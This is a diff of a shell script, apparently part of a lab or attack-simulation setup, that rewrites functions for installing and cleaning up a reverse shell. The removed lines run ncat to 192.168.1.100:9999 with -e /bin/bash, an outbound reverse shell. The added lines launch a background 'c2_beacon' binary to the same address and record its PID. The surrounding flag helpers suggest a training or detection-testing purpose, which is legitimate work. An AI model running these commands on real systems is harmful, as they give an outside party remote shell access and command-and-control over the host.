@@ -1,11 +1,22 @@
+# Outbound reverse shell + C2 beacon
 install_reverse_shell() {
-    [ -f /tmp/.reverse_shell_active ] && return 0
-    ncat 192.168.1.100 9999 -e /bin/bash &
-    touch /tmp/.reverse_shell_active
-    echo "[+] Reverse shell to 192.168.1.100:9999"
+    echo "[*] Starting reverse shell & C2 beacon..."
+    # C2 beacon to 192.168.1.100:9999
+    nohup "$ASSETS_DIR/build/c2_beacon" 192.168.1.100 9999 >/dev/null 2>&1 &
+    echo $! > /tmp/reverse_shell.pid
+    set_flag "reverse_shell"
 }
+
 clean_reverse_shell() {
-    pgrep -f "ncat.*192.168.1.100.*9999" | xargs -r kill -9 2>/dev/null
-    rm -f /tmp/.reverse_shell_active
-    echo "[+] Reverse shell cleaned"
+    echo "[*] Cleaning reverse shell..."
+    if [ -f /tmp/c2_beacon.pid ]; then
+        kill $(cat /tmp/c2_beacon.pid) 2>/dev/null || true
+        rm -f /tmp/c2_beacon.pid
+    fi
+    if [ -f /tmp/reverse_shell.pid ]; then
+        kill $(cat /tmp/reverse_shell.pid) 2>/dev/null || true
+        rm -f /tmp/reverse_shell.pid
+    fi
+    pkill -f "c2_beacon" 2>/dev/null || true
+    clear_flag "reverse_shell"
 }
